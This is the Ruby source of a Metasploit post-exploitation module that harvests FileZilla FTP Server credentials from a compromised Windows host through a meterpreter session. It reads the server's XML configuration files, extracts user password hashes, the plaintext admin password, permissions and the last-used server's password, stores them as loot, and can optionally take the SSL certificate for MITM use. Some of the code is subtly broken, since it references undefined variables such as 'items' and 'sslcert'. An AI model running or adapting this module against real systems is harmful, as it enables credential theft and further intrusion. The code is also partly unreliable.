##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rexml/document'

class MetasploitModule < Msf::Post
  include Msf::Post::File

  def initialize(info = {})
    super( update_info(info,
      'Name'           => 'Windows Gather FileZilla FTP Server Credential Collection',
      'Description'    => %q{ This module will collect credentials from the FileZilla FTP server if installed. },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'bannedit',  # original idea & module
          'g0tmi1k'    # @g0tmi1k // https://blog.g0tmi1k.com/ - additional features
        ],
      'Platform'       => ['win'],
      'SessionTypes'   => ['meterpreter' ]
    ))

    register_options([
      OptBool.new('SSLCERT', [false, 'Loot the SSL Certificate if its there?', false]), # useful perhaps for MITM
    ])
  end


  def run
    if session.type != "meterpreter"
      print_error "Only meterpreter sessions are supported by this post module"
      return
    end

    progfiles_env = session.sys.config.getenvs('ProgramFiles', 'ProgramFiles(x86)', 'ProgramW6432')
    locations = []
    progfiles_env.each do |k, v|
      next if v.blank?
      locations << v + "\\FileZilla Server\\"
    end

    keys = [
      "HKLM\\SOFTWARE\\FileZilla Server",
      "HKLM\\SOFTWARE\\Wow6432Node\\FileZilla Server",
    ]

    keys.each do |key|
      begin
        root_key, base_key = session.sys.registry.splitkey(key)
        value = session.sys.registry.query_value_direct(root_key, base_key, "install_dir")
      rescue Rex::Post::Meterpreter::RequestError => e
        vprint_error(e.message)
        next
      end
      locations << value.data + "\\"
    end

    locations = locations.uniq
    filezilla = check_filezilla(locations)
    get_filezilla_creds(filezilla) if filezilla
  end


  def check_filezilla(locations)
    paths = []
    begin
      locations.each do |location|
        print_status("Checking for Filezilla Server directory in: #{location}")
        begin
          session.fs.dir.foreach("#{location}") do |fdir|
            ['FileZilla Server.xml','FileZilla Server Interface.xml'].each do |xmlfile|
              if fdir == xmlfile
                filepath = location + xmlfile
                print_good("Configuration file found: #{filepath}")
                paths << filepath
              end
            end
          end
        rescue Rex::Post::Meterpreter::RequestError => e
          vprint_error(e.message)
        end
      end
    rescue ::Exception => e
      print_error(e.to_s)
      return
    end

    if !paths.empty?
      print_good("Found FileZilla Server on #{sysinfo['Computer']} via session ID: #{session.sid}")
      print_line
      return paths
    end

    return nil
  end


  def get_filezilla_creds(paths)
    fs_xml  = ""   # FileZilla Server.xml           - Settings for the local install
    fsi_xml = ""   # FileZilla Server Interface.xml - Last server used with the interface
    credentials = Rex::Text::Table.new(
    'Header'    => "FileZilla FTP Server Credentials",
    'Indent'    => 1,
    'Columns'   =>
    [
      "Host",
      "Port",
      "User",
      "Password",
      "SSL"
    ])

    permissions = Rex::Text::Table.new(
    'Header'    => "FileZilla FTP Server Permissions",
    'Indent'    => 1,
    'Columns'   =>
    [
      "Host",
      "User",
      "Dir",
      "FileRead",
      "FileWrite",
      "FileDelete",
      "FileAppend",
      "DirCreate",
      "DirDelete",
      "DirList",
      "DirSubdirs",
      "AutoCreate",
      "Home"
    ])

    configuration = Rex::Text::Table.new(
    'Header'      => "FileZilla FTP Server Configuration",
    'Indent'      => 1,
    'Columns'     =>
    [
      "FTP Port",
      "FTP Bind IP",
      "Admin Port",
      "Admin Bind IP",
      "Admin Password",
      "SSL",
      "SSL Certfile",
      "SSL Key Password"
    ])

    lastserver = Rex::Text::Table.new(
    'Header'   => "FileZilla FTP Last Server",
    'Indent'   => 1,
    'Columns'  =>
    [
      "IP",
      "Port",
      "Password"
    ])


    paths.each do |path|
      file = session.fs.file.new(path, "rb")
      until file.eof?
        if path.include? "FileZilla Server.xml"
         fs_xml << file.read
        elsif path.include? "FileZilla Server Interface.xml"
         fsi_xml << file.read
        end
      end
      file.close
    end

    # user credentials password is just an MD5 hash
    # admin pass is just plain text. Priorities?
    creds, perms, config = parse_server(fs_xml)

    creds.each do |cred|
      credentials << [cred['host'], cred['port'], cred['user'], cred['password'], cred['ssl']]

      session.db_record ? (source_id = session.db_record.id) : (source_id = nil)

      service_data = {
        address: session.session_host,
        port: config['ftp_port'],
        service_name: 'ftp',
        protocol: 'tcp',
        workspace_id: myworkspace_id
      }

      credential_data = {
        origin_type: :session,
        jtr_format: 'raw-md5',
        session_id: session_db_id,
        post_reference_name: self.refname,
        private_type: :nonreplayable_hash,
        private_data: cred['password'],
        username: cred['user']
      }

      credential_data.merge!(service_data)

      credential_core = create_credential(credential_data)

      # Assemble the options hash for creating the Metasploit::Credential::Login object
      login_data ={
        core: credential_core,
        status: Metasploit::Model::Login::Status::UNTRIED
      }

      # Merge in the service data and create our Login
      login_data.merge!(service_data)
      create_credential_login(login_data)
    end

    perms.each do |perm|
      permissions << [perm['host'], perm['user'], perm['dir'], perm['fileread'], perm['filewrite'],
        perm['filedelete'], perm['fileappend'], perm['dircreate'], perm['dirdelete'], perm['dirlist'],
        perm['dirsubdirs'], perm['autocreate'], perm['home']]
    end

    session.db_record ? (source_id = session.db_record.id) : (source_id = nil)

    # report the goods!
    if config['admin_pass'] == "<none>"
      vprint_status("Detected Default Adminstration Settings:")
    else
      vprint_status("Collected the following configuration details:")
      service_data = {
        address: session.session_host,
        port: config['admin_port'],
        service_name: 'filezilla-admin',
        protocol: 'tcp',
        workspace_id: myworkspace_id
      }

      credential_data = {
        origin_type: :session,
        session_id: session_db_id,
        post_reference_name: self.refname,
        private_type: :password,
        private_data: config['admin_pass'],
        username: 'admin'
      }

      credential_data.merge!(service_data)

      credential_core = create_credential(credential_data)

      # Assemble the options hash for creating the Metasploit::Credential::Login object
      login_data ={
        core: credential_core,
        status: Metasploit::Model::Login::Status::UNTRIED
      }

      # Merge in the service data and create our Login
      login_data.merge!(service_data)
      create_credential_login(login_data)
    end

    vprint_status("       FTP Port: #{config['ftp_port']}")
    vprint_status("    FTP Bind IP: #{config['ftp_bindip']}")
    vprint_status("            SSL: #{config['ssl']}")
    vprint_status("     Admin Port: #{config['admin_port']}")
    vprint_status("  Admin Bind IP: #{config['admin_bindip']}")
    vprint_status("     Admin Pass: #{config['admin_pass']}")
    vprint_line

    configuration << [config['ftp_port'], config['ftp_bindip'], config['admin_port'], config['admin_bindip'],
      config['admin_pass'], config['ssl'], config['ssl_certfile'], config['ssl_keypass']]

    begin
      lastser = parse_interface(fsi_xml)
      lastserver << [lastser['ip'], lastser['port'], lastser['password']]
      vprint_status("Last Server Information:")
      vprint_status("         IP: #{lastser['ip']}")
      vprint_status("       Port: #{lastser['port']}")
      vprint_status("   Password: #{lastser['password']}")
      vprint_line

    rescue
      vprint_error("Could not parse FileZilla Server Interface.xml")
    end
    loot_path = store_loot("filezilla.server.creds", "text/csv", session, credentials.to_csv,
      "filezilla_server_credentials.csv", "FileZilla FTP Server Credentials")
    print_status("Credentials saved in: #{loot_path}")

    loot_path = store_loot("filezilla.server.perms", "text/csv", session, permissions.to_csv,
      "filezilla_server_permissions.csv", "FileZilla FTP Server Permissions")
    print_status("Permissions saved in: #{loot_path}")

    loot_path = store_loot("filezilla.server.config", "text/csv", session, configuration.to_csv,
      "filezilla_server_configuration.csv", "FileZilla FTP Server Configuration")
    print_status("     Config saved in: #{loot_path}")

    loot_path = store_loot("filezilla.server.lastser", "text/csv", session, lastserver.to_csv,
      "filezilla_server_lastserver.csv", "FileZilla FTP Last Server")
    print_status(" Last server history: #{loot_path}")

    print_line
  end


  def parse_server(data)
    creds  = []
    perms  = []
    groups = []
    settings = {}
    users     = 0
    passwords = 0

    begin
      doc = REXML::Document.new(data).root
    rescue REXML::ParseException
      print_error("Invalid xml format")
    end

    opt = doc.elements.to_a("Settings/Item")
    if opt[1].nil?    # Default value will only have a single line, for admin port - no adminstration settings
      settings['admin_port'] = opt[0].text rescue "<none>"
      settings['ftp_port']   = 21
    else
      settings['ftp_port']   = opt[0].text rescue 21
      settings['admin_port'] = opt[16].text rescue "<none>"
    end
    settings['admin_pass'] = opt[17].text rescue "<none>"
    settings['local_host'] = opt[18].text rescue ""
    settings['bindip']     = opt[38].text rescue ""
    settings['ssl']        = opt[42].text rescue ""

    # empty means localhost only * is 0.0.0.0
    if settings['local_host']
      settings['admin_bindip'] = settings['local_host']
    else
      settings['admin_bindip'] = "127.0.0.1"
    end
    settings['admin_bindip'] = "0.0.0.0" if settings['admin_bindip'] == "*" || settings['admin_bindip'].empty?

    if settings['bindip']
      settings['ftp_bindip'] = settings['bindip']
    else
      settings['ftp_bindip'] = "127.0.0.1"
    end
    settings['ftp_bindip'] = "0.0.0.0" if settings['ftp_bindip'] == "*" || settings['ftp_bindip'].empty?

    settings['ssl'] = settings['ssl'] == "1"
    if !settings['ssl'] && datastore['SSLCERT']
      print_error("Cannot loot the SSL Certificate, SSL is disabled in the configuration file")
    end

    settings['ssl_certfile'] = items[45].text rescue "<none>"
    # Get the file if it is there. It could be useful in MITM attacks
    if settings['ssl_certfile'] != "<none>" && settings['ssl'] and datastore['SSLCERT']
      sslfile = session.fs.file.new(settings['ssl_certfile'])
      until sslfile.eof?
        sslcert << sslfile.read
      end
      store_loot("filezilla.server.ssl.cert", "text/plain", session, sslfile,
        settings['ssl_cert'] + ".txt", "FileZilla Server SSL Certificate File" )
      print_status("Looted SSL Certificate File")
    end

    settings['ssl_certfile'] = "<none>" if settings['ssl_certfile'].nil?

    settings['ssl_keypass'] = items[50].text rescue "<none>"
    settings['ssl_keypass'] = "<none>" if settings['ssl_keypass'].nil?

    vprint_status("Collected the following credentials:") if doc.elements['Users']

    doc.elements.each("Users/User") do |user|
      account = {}
      opt = user.elements.to_a("Option")
      account['user']     = user.attributes['Name'] rescue "<none>"
      account['password'] = opt[0].text rescue "<none>"
      account['group']    = opt[1].text rescue "<none>"
      users     += 1
      passwords += 1
      groups << account['group']

      user.elements.to_a("Permissions/Permission").each do |permission|
        perm = {}
        opt = permission.elements.to_a("Option")
        perm['user']       = user.attributes['Name'] rescue "<unknown>"
        perm['dir']        = permission.attributes['Dir'] rescue "<unknown>"
        perm['fileread']   = opt[0].text rescue "<unknown>"
        perm['filewrite']  = opt[1].text rescue "<unknown>"
        perm['filedelete'] = opt[2].text rescue "<unknown>"
        perm['fileappend'] = opt[3].text rescue "<unknown>"
        perm['dircreate']  = opt[4].text rescue "<unknown>"
        perm['dirdelete']  = opt[5].text rescue "<unknown>"
        perm['dirlist']    = opt[6].text rescue "<unknown>"
        perm['dirsubdirs'] = opt[7].text rescue "<unknown>"
        perm['autocreate'] = opt[9].text rescue "<unknown>"
        perm['host']       = settings['ftp_bindip']

        opt[8].text == "1" ? (perm['home'] = "true") : (perm['home'] = "false")

        perms << perm
      end

      user.elements.to_a("IpFilter/Allowed").each do |allowed|
      end
      user.elements.to_a("IpFilter/Disallowed").each do |disallowed|
      end

      account['host'] = settings['ftp_bindip']
      account['port'] = settings['ftp_port']
      account['ssl']  = settings['ssl'].to_s
      creds << account

      vprint_status("    Username: #{account['user']}")
      vprint_status("    Password: #{account['password']}")
      vprint_status("       Group: #{account['group']}") if account['group']
      vprint_line
    end

    # Rather than printing out all the values, just count up
    groups = groups.uniq unless groups.uniq.nil?
    if !datastore['VERBOSE']
      print_status("Collected the following credentials:")
      print_status("    Usernames: #{users}")
      print_status("    Passwords: #{passwords}")
      print_status("       Groups: #{groups.length}")
      print_line
    end
    return [creds, perms, settings]
  end


  def parse_interface(data)
    lastser = {}

    begin
      doc = REXML::Document.new(data).root
    rescue REXML::ParseException
      print_error("Invalid xml format")
      return lastser
    end

    opt = doc.elements.to_a("Settings/Item")

    opt.each do |item|
      case item.attributes['name']
      when /Address/
        lastser['ip'] = item.text
      when /Port/
        lastser['port'] = item.text
      when /Password/
        lastser['password'] = item.text
      end
    end

    lastser['password'] = "<none>" if lastser['password'].nil?

    lastser
  end


  def got_root?
    session.sys.config.getuid =~ /SYSTEM/ ? true : false
  end


  def whoami
    session.sys.config.getenv('USERNAME')
  end
end
